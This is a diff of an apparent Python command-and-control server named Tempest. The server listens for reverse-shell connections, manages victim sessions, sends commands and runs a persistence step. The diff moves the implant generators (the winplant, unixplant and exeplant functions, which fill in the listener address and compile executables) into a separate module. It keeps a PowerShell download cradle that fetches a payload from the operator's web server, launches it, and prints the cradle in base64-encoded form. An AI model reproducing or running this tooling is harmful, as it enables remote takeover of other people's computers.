@@ -1,13 +1,11 @@
 from datetime import datetime
 from prettytable import PrettyTable
+from shells import reverseshell
 
 import base64
-import os
 import random
-import shutil
 import socket
 import string
-import subprocess
 import threading
 import time
 """
@@ -41,8 +39,8 @@ def banner():
     print(bcolors.HEADER + '/__ __\/  __// \__/|/  __\/  __// ___\/__ __\\' + bcolors.ENDC)
     print(bcolors.HEADER + '  / \  |  \  | |\/|||  \/||  \  |    \  / \  ' + bcolors.ENDC)
     print(bcolors.HEADER + '  | |  |  /_ | |  |||  __/|  /_ \___ |  | |  ' + bcolors.ENDC)
-    print(bcolors.HEADER + '  \_/  \____\\\\_/  \|\_/   \____\\\\____/  \_/  ' + bcolors.ENDC)
-    print(bcolors.HEADER + bcolors.BOLD + '\nBy HK Transfield' + bcolors.ENDC)
+    print(bcolors.HEADER + '  \_/  \____\\\\_/  \|\_/   \____\\\\____/  \_/ ' + bcolors.ENDC)
+    print(bcolors.HEADER + bcolors.BOLD + '\nCreated By HK Transfield' + bcolors.ENDC)
     print(bcolors.HEADER + '=============================================\n' + bcolors.ENDC)
 
 def help():
@@ -64,7 +62,7 @@ def help():
     exit                    ---> Terminates the current session
     ''')
 
-def comm_in(target_id):
+def comms_in(target_id):
     """ Handles all responses sent from a sockclient.
 
     Args:
@@ -79,7 +77,7 @@ def comm_in(target_id):
     response = response.decode().strip()
     return response
 
-def comm_out(target_id, message):
+def comms_out(target_id, message):
     """ Sends commands from the sockserver to a sockclient.
 
     Args:
@@ -106,7 +104,7 @@ def target_comm(target_id, targets, num):
         if message == 'help':
             pass
         else:
-            comm_out(target_id, message)
+            comms_out(target_id, message)
 
             if message == 'background':
                 break
@@ -140,7 +138,7 @@ def target_comm(target_id, targets, num):
                 print(bcolors.OKGREEN + '[+] Persistence technique completed.' + bcolors.ENDC)
 
             else:
-                response = comm_in(target_id)
+                response = comms_in(target_id)
                 if response == 'exit':
                     print('[-] The client has terminated the session')
                     target_id.close()
@@ -151,15 +149,13 @@ def listener_handler():
     """ Hosts the listener for the socket, binds the socket, accepts
         traffic, and then redirects that traffic.
     """
-
-    # 1 Accept Connection
     sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
-    t1 = threading.Thread(target = comm_handler)
+    t1 = threading.Thread(target = comms_handler)
     t1.start()
 
-def comm_handler():
+def comms_handler():
     """ Directs traffic to where it needs to go and ensures that it is
         receiving it where needed.
     """
@@ -231,112 +227,17 @@ def powershell_cradle():
     print('[+] Run the following command to start a web server: ' + bcolors.BOLD + f'\npython3 -m http.server -b {web_server_ip} {web_server_port}')
 
     runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
+
     with open(runner_file, 'w') as f:
         f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
         f.close()
+
     b64_runner_cal = base64.b64encode(runner_cal_unencoded)
     b64_runner_cal = b64_runner_cal.decode()
     print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
+
     b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
     print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
-
-
-### PAYLOADS ###
-def winplant():
-
-    # generate random filename
-    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
-    file_name = f'{rand_name}.py'
-    print(f'[+] Generating Windows payload file: {file_name}')
-
-    check_cwd = os.getcwd()
-    print(f'[+] Checking for {check_cwd}\\winplant.py')
-    # check if payload path exists on the system
-    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
-        # copy it to the newly generated file
-        shutil.copy('winplant.py', file_name)
-    else:
-        print(bcolors.WARNING + '[-] winplant.py file not found.')
-
-    with open(file_name) as f:
-        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
-        f.write(new_host)
-        f.close()
-    with open(file_name) as f:
-        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
-        f.write(new_port)
-        f.close()
-
-    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
-        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
-    else:
-        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
-
-def unixplant():
-
-    # generate random filename
-    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
-    file_name = f'{rand_name}.py'
-    print(f'[+] Generating Linux payload file: {file_name}')
-
-    check_cwd = os.getcwd()
-    if os.path.exists(f'{check_cwd}\\unixplant.py') or os.path.exists(f'{check_cwd}/unixplant.py'):
-        shutil.copy('winplant.py', file_name)
-    else:
-        print(bcolors.WARNING + '[-] unixplant.py file not found.')
-
-    with open(file_name) as f:
-        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
-        f.write(new_host)
-        f.close()
-    with open(file_name) as f:
-        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
-        f.write(new_port)
-        f.close()
-    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
-        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
-    else:
-        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
-
-def exeplant():
-    # generate random filename
-    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
-    file_name = f'{rand_name}.py'
-    exe_file = f'{rand_name}.exe'
-    print(f'[+] Generating exe payload file: {file_name}')
-
-    check_cwd = os.getcwd()
-    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
-        shutil.copy('winplant.py', file_name)
-    else:
-        print(bcolors.WARNING + '[-] winplant.py file not found.')
-
-    with open(file_name) as f:
-        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(file_name, 'w') as f:
-        f.write(new_host)
-        f.close()
-    with open(file_name) as f:
-        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(file_name, 'w') as f:
-        f.write(new_port)
-        f.close()
-
-    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
-    # pyinstaller_exec = f'pyinstaller'
-    print(f'[+] Compiling executable {exe_file}...')
-    subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
-    os.remove(f'{rand_name}.spec')
-    shutil.rmtree('build')
-
-    if os.path.exists(f'{check_cwd}\\{exe_file}') or os.path.exists(f'{check_cwd}/{file_name}'):
-        print(bcolors.OKGREEN + f'[+] {exe_file} saved to current directory.' + bcolors.ENDC)
-    else:
-        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
 
 if __name__ == '__main__':
     """ Main function. This is the entry
@@ -350,7 +251,7 @@ if __name__ == '__main__':
 
     while True:
         try:
-            command = input('Enter command $ ')
+            command = input('Tempest>> ')
 
             if command == 'help':
                 help()
@@ -366,19 +267,19 @@ if __name__ == '__main__':
 
             if command == 'winplant py':
                 if listener_counter > 0:
-                    winplant()
+                    reverseshell.create_windows_payload(host_ip, host_port)
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate a Windows payload without an active listener' + bcolors.ENDC)
 
             if command == 'unixplant py':
                 if listener_counter > 0:
-                    unixplant()
+                    reverseshell.create_unix_payload(host_ip, host_port)
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate a Linux payload without an active listener' + bcolors.ENDC)
 
             if command == 'exeplant':
                 if listener_counter > 0:
-                    exeplant()
+                    reverseshell.create_exe_payload(host_ip, host_port)
                 else:
                     print(bcolors.WARNING + '[-] You cannot generate an exe payload without an active listener' + bcolors.ENDC)
 
@@ -390,7 +291,7 @@ if __name__ == '__main__':
                         if target[7] == 'Dead':
                             pass
                         else:
-                            comm_out(target[0], 'exit')
+                            comms_out(target[0], 'exit')
                     kill_flag = 1
                     if listener_counter > 0:
                         sock.close()
@@ -403,7 +304,7 @@ if __name__ == '__main__':
                         num = int(command.split(" ")[1])
                         target_id = (targets[num])[0]
                         if (targets[num])[7] == 'Active':
-                            comm_out(target_id, 'exit')
+                            comms_out(target_id, 'exit')
                             targets[num][7] = 'Dead'
                             print(f'[+] Sessions {num} terminated.')
                         else:
@@ -472,7 +373,7 @@ if __name__ == '__main__':
                     if target[7] == 'Dead':
                         pass
                     else:
-                        comm_out(target[0], 'exit')
+                        comms_out(target[0], 'exit')
                 kill_flag = 1
                 if listener_counter > 0:
                     sock.close()
